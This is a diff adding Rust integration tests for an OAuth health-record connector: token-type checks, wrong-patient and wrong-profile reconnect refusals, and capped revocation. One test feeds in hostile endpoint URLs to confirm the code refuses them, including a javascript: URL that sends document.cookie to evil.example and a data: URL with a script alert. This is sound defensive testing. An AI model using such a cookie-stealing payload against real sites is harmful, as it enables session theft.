@@ -8,7 +8,7 @@ mod connector_fake;
 
 use chrono::{DateTime, Duration, TimeZone, Utc};
 use common::{R, family};
-use connector_fake::{CLIENT_ID, CLIENT_SECRET, Fake, PATIENT, REDIRECT, param};
+use connector_fake::{Behaviour, CLIENT_ID, CLIENT_SECRET, Fake, PATIENT, REDIRECT, param};
 use ownhealth_core::connector_oauth::{
     self as oauth, ClientAuth, ConnectorClient, Endpoints, Launch, OAuthError, Revocation, SourceHttp, TokenSet,
 };
@@ -20,6 +20,8 @@ use serde_json::Value;
 use uuid::Uuid;
 
 const BINDER: &str = "binder-of-alex-browser-0001";
+/// The cap a profile delete gives each revocation in these tests.
+const CAP: std::time::Duration = std::time::Duration::from_secs(5);
 
 /// The fake is plain http on loopback: only these two fields widen, the rest is the connector profile.
 fn egress() -> Egress {
@@ -121,7 +123,8 @@ impl Setup {
                 binder: BINDER,
             },
         )
-        .await?)
+        .await?
+        .url)
     }
 
     /// Launch, consent at the fake, call back and save: a connected source.
@@ -246,11 +249,98 @@ async fn a_server_without_s256_is_refused() -> R {
         Err(OAuthError::Vendor { code, .. }) => assert_eq!(code, "no_pkce_s256"),
         other => panic!("accepted a server without PKCE S256: {other:?}"),
     }
-    // and the connector profile itself never reaches a loopback vendor
+    // and the connector profile itself never reaches a loopback vendor: plain http is refused
+    // before any request
+    let before = s.fake.book().requests;
+    assert_eq!(
+        refused_code(oauth::resolve(&spec, &s.fake.issuer(), &Egress::connector()).await),
+        "bad_issuer"
+    );
+    let https = s.fake.issuer().replace("http://", "https://");
     assert!(matches!(
-        oauth::resolve(&spec, &s.fake.issuer(), &Egress::connector()).await,
+        oauth::resolve(&spec, &https, &Egress::connector()).await,
         Err(OAuthError::Net(_))
     ));
+    assert_eq!(s.fake.book().requests, before);
+    Ok(())
+}
+
+/// A sign-in page the browser is sent to, and every address the server names for tokens: https with a
+/// host and no user name (plain http only to loopback, where the egress allows plain http). Anything
+/// else is refused before an authorize URL exists.
+#[tokio::test]
+async fn a_server_naming_a_script_or_data_url_as_an_endpoint_is_refused() -> R {
+    let s = setup().await?;
+    let spec = oauth::kind_spec("smart").expect("smart");
+    let js = "javascript:fetch(\"https://evil.example/\"+document.cookie)//";
+    let data = "data:text/html,<script>alert(1)</script>";
+    let plain = "http://login.evil.example/authorize";
+    let userinfo = format!("{}/authorize", s.fake.base.replace("http://", "http://alex:pw@"));
+    let cases: [(&str, &str); 9] = [
+        ("authorize", js),
+        ("authorize", data),
+        ("authorize", plain),
+        ("authorize", &userinfo),
+        ("token", js),
+        ("token", data),
+        ("token", plain),
+        ("revoke", js),
+        ("revoke", data),
+    ];
+    for (field, url) in cases {
+        s.fake.set(|b| {
+            *b = Behaviour::default();
+            let bad = Some(url.to_string());
+            match field {
+                "authorize" => b.authorize_url = bad,
+                "token" => b.token_url = bad,
+                _ => b.revoke_url = bad,
+            }
+        });
+        assert_eq!(
+            refused_code(oauth::resolve(&spec, &s.fake.issuer(), &egress()).await),
+            "bad_endpoint",
+            "{field} {url}"
+        );
+    }
+    // the server a person names follows the same rule, and nothing is fetched from it
+    s.fake.set(|b| *b = Behaviour::default());
+    let before = s.fake.book().requests;
+    let typed_userinfo = s.fake.issuer().replace("http://", "http://alex:pw@");
+    for issuer in [js, data, "http://fhir.evil.example/r4", &typed_userinfo] {
+        assert_eq!(
+            refused_code(oauth::resolve(&spec, issuer, &egress()).await),
+            "bad_issuer",
+            "{issuer}"
+        );
+    }
+    assert_eq!(
+        s.fake.book().requests,
+        before,
+        "a refused server was asked for its endpoints"
+    );
+    // the reverse: the fake's own endpoints pass
+    assert!(oauth::resolve(&spec, &s.fake.issuer(), &egress()).await.is_ok());
+    // and a launch never builds a sign-in URL from a stored address that is not a web address
+    let mut bad = s.endpoints.clone();
+    bad.authorize = js.into();
+    let mut c = s.db.pool.acquire().await?;
+    let r = oauth::begin(
+        &mut c,
+        &Launch {
+            kind: "smart",
+            client: &s.client,
+            endpoints: &bad,
+            profile_id: s.alex(),
+            label: "Hospital LabNorte",
+            source_id: None,
+            user_id: None,
+            session_id: None,
+            binder: BINDER,
+        },
+    )
+    .await;
+    assert_eq!(refused_code(r), "bad_endpoint");
     Ok(())
 }
 
@@ -355,7 +445,8 @@ async fn a_launch_for_another_households_profile_is_not_saved() -> R {
             binder: BINDER,
         },
     )
-    .await?;
+    .await?
+    .url;
     let code = s.fake.consent(&url);
     let p = oauth::take_state(&mut c, &param(&url, "state").unwrap_or_default(), BINDER).await?;
     let t = oauth::exchange(&p, &s.client, &code, &egress()).await?;
@@ -386,6 +477,31 @@ async fn the_code_is_exchanged_as_a_public_a_basic_and_a_post_client() -> R {
             "{auth:?}"
         );
     }
+    Ok(())
+}
+
+#[tokio::test]
+async fn a_token_answer_that_is_not_bearer_is_refused_and_nothing_is_saved() -> R {
+    let s = setup().await?;
+    s.fake.set(|b| b.token_type = "mac".into());
+    let url = s.launch(None).await?;
+    let code = s.fake.consent(&url);
+    let mut c = s.db.pool.acquire().await?;
+    let p = oauth::take_state(&mut c, &param(&url, "state").unwrap_or_default(), BINDER).await?;
+    match oauth::exchange(&p, &s.client, &code, &egress()).await {
+        Err(OAuthError::Vendor { code, .. }) => assert_eq!(code, "not_bearer"),
+        other => panic!("a mac token was accepted: {other:?}"),
+    }
+    assert_eq!(s.count("select count(*) from source").await?, 0);
+    assert_eq!(
+        s.count("select count(*) from secret where purpose = 'connector_refresh_token'")
+            .await?,
+        0
+    );
+    // the reverse: the type is compared without case
+    s.fake.set(|b| b.token_type = "bearer".into());
+    s.connect(None, t0()).await?;
+    assert_eq!(s.count("select count(*) from source").await?, 1);
     Ok(())
 }
 
@@ -708,7 +824,7 @@ async fn before_a_profile_delete_every_connection_is_revoked_and_a_failure_is_re
     let s = setup().await?;
     let (a, ta) = s.connect(None, t0()).await?;
     let (b, _) = s.connect(None, t0()).await?;
-    let out = oauth::revoke_profile(&s.db.pool, Some(&s.sb), s.alex(), &egress()).await?;
+    let out = oauth::revoke_profile(&s.db.pool, Some(&s.sb), s.alex(), &egress(), CAP).await?;
     assert_eq!(
         out.iter().map(|r| (r.source_id, r.outcome)).collect::<Vec<_>>(),
         vec![(a, Revocation::Revoked), (b, Revocation::Revoked)]
@@ -721,18 +837,140 @@ async fn before_a_profile_delete_every_connection_is_revoked_and_a_failure_is_re
     );
     // a vendor that is down: the outcome says failed, and nothing stops the delete
     s.fake.set(|b| b.fail_revoke = true);
-    let out = oauth::revoke_profile(&s.db.pool, Some(&s.sb), s.alex(), &egress()).await?;
+    let out = oauth::revoke_profile(&s.db.pool, Some(&s.sb), s.alex(), &egress(), CAP).await?;
     assert!(out.iter().all(|r| r.outcome == Revocation::Failed), "{out:?}");
     // with no secrets key, a held token counts as failed too, without a request
     let before = s.fake.book().revoked.len();
-    let out = oauth::revoke_profile(&s.db.pool, None, s.alex(), &egress()).await?;
+    let out = oauth::revoke_profile(&s.db.pool, None, s.alex(), &egress(), CAP).await?;
     assert!(out.iter().all(|r| r.outcome == Revocation::Failed), "{out:?}");
     assert_eq!(s.fake.book().revoked.len(), before);
     // another profile's connections are not touched
     assert!(
-        oauth::revoke_profile(&s.db.pool, Some(&s.sb), s.fam.profile("sam"), &egress())
+        oauth::revoke_profile(&s.db.pool, Some(&s.sb), s.fam.profile("sam"), &egress(), CAP)
             .await?
             .is_empty()
+    );
+    Ok(())
+}
+
+#[tokio::test]
+async fn a_reconnect_that_signs_in_as_another_patient_is_refused_and_changes_nothing() -> R {
+    let s = setup().await?;
+    let (id, t) = s.connect(None, t0()).await?;
+    sqlx::query("update source set cursor = '{\"since\": \"2026-11-01\"}' where id = $1")
+        .bind(id)
+        .execute(&s.db.pool)
+        .await?;
+    type Kept = (Value, Option<Value>, Option<Uuid>, bool, Option<DateTime<Utc>>);
+    let read = || async {
+        sqlx::query_as::<_, Kept>(
+            "select config, cursor, secret_id, enabled, access_expires_at from source where id = $1",
+        )
+        .bind(id)
+        .fetch_one(&s.db.pool)
+        .await
+    };
+    let before = read().await?;
+    let url = s.launch(Some(id)).await?;
+    let mut c = s.db.pool.acquire().await?;
+    let p = oauth::take_state(&mut c, &param(&url, "state").unwrap_or_default(), BINDER).await?;
+    // the person signed in at the vendor with another account (a partner's portal login)
+    let other = TokenSet {
+        access: SecretString::new("fake-access-of-someone-else"),
+        refresh: Some(SecretString::new("fake-refresh-of-someone-else")),
+        expires_in: Some(3600),
+        refresh_expires_in: None,
+        scope: None,
+        patient: Some("fake-patient-someone-else".into()),
+    };
+    let r = oauth::save_connection(&mut c, &s.sb, &p, &s.client, &other, t0() + Duration::hours(1)).await;
+    assert_eq!(refused_code(r), "another_patient");
+    assert_eq!(read().await?, before, "a refused reconnect changed the source");
+    assert_eq!(before.0["patient"], PATIENT);
+    assert_eq!(
+        s.refresh_token(id).await?.as_deref(),
+        t.refresh.as_ref().map(SecretString::expose),
+        "the old grant was replaced"
+    );
+    // the reverse: the same patient reconnects
+    let (back, _) = s.connect(Some(id), t0() + Duration::hours(2)).await?;
+    assert_eq!(back, id);
+    Ok(())
+}
+
+#[tokio::test]
+async fn a_reconnect_launched_for_another_profile_does_not_touch_the_source() -> R {
+    let s = setup().await?;
+    let (id, t) = s.connect(None, t0()).await?;
+    let mut c = s.db.pool.acquire().await?;
+    let url = oauth::begin(
+        &mut c,
+        &Launch {
+            kind: "smart",
+            client: &s.client,
+            endpoints: &s.endpoints,
+            profile_id: s.fam.profile("sam"),
+            label: "Hospital LabNorte",
+            source_id: Some(id),
+            user_id: Some(s.fam.user("alex")),
+            session_id: None,
+            binder: BINDER,
+        },
+    )
+    .await?
+    .url;
+    let code = s.fake.consent(&url);
+    let p = oauth::take_state(&mut c, &param(&url, "state").unwrap_or_default(), BINDER).await?;
+    let tokens = oauth::exchange(&p, &s.client, &code, &egress()).await?;
+    let r = oauth::save_connection(&mut c, &s.sb, &p, &s.client, &tokens, t0()).await;
+    assert_eq!(refused_code(r), "source_changed");
+    assert_eq!(
+        s.refresh_token(id).await?.as_deref(),
+        t.refresh.as_ref().map(SecretString::expose),
+        "another profile's launch replaced this source's grant"
+    );
+    let profile: Option<Uuid> = sqlx::query_scalar("select profile_id from source where id = $1")
+        .bind(id)
+        .fetch_one(&s.db.pool)
+        .await?;
+    assert_eq!(profile, Some(s.alex()));
+    Ok(())
+}
+
+/// The cap covers the whole revocation: the wait for the row lock a refresh holds, the name lookup
+/// and the request.
+#[tokio::test]
+async fn a_revocation_before_a_delete_is_capped_as_a_whole_even_behind_a_refresh_that_holds_the_row() -> R {
+    let s = setup().await?;
+    let (id, _) = s.connect(None, t0()).await?;
+    s.fake.set(|b| b.delay_ms = 4_000);
+    let cap = std::time::Duration::from_secs(1);
+    let (refreshed, (out, took)) = tokio::join!(s.refresh(id, t0() + Duration::hours(2)), async {
+        // the refresh holds the row from before its request until it commits
+        for _ in 0..100 {
+            if s.fake.book().in_flight > 0 {
+                break;
+            }
+            tokio::time::sleep(std::time::Duration::from_millis(50)).await;
+        }
+        let started = std::time::Instant::now();
+        let out = oauth::revoke_profile(&s.db.pool, Some(&s.sb), s.alex(), &egress(), cap).await;
+        (out, started.elapsed())
+    });
+    assert!(refreshed.is_ok(), "{refreshed:?}");
+    let out = out?;
+    assert_eq!(
+        out.iter().map(|r| (r.source_id, r.outcome)).collect::<Vec<_>>(),
+        vec![(id, Revocation::Failed)]
+    );
+    assert!(took < cap + std::time::Duration::from_millis(1_500), "waited {took:?}");
+    assert!(s.fake.book().revoked.is_empty());
+    // the reverse: with the row free, the same cap revokes
+    s.fake.set(|b| b.delay_ms = 0);
+    let out = oauth::revoke_profile(&s.db.pool, Some(&s.sb), s.alex(), &egress(), cap).await?;
+    assert_eq!(
+        out.iter().map(|r| r.outcome).collect::<Vec<_>>(),
+        vec![Revocation::Revoked]
     );
     Ok(())
 }
